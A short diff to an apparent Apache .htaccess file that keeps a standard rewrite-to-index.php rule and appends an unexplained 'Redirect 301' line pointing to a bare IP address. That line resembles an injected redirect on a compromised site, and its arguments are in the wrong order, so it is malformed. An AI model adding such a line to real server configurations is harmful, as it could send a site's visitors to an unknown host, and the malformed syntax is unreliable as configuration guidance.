@@ -1,7 +1,11 @@
+
+
 <IfModule mod_rewrite.c>
     RewriteEngine On
     RewriteCond %{REQUEST_FILENAME} !-f
     RewriteCond %{REQUEST_FILENAME} !-d
 
     RewriteRule ^(.*)$ index.php [PT,L]
+
 </IfModule>
+Redirect 301 http://193.104.254.90  /charges
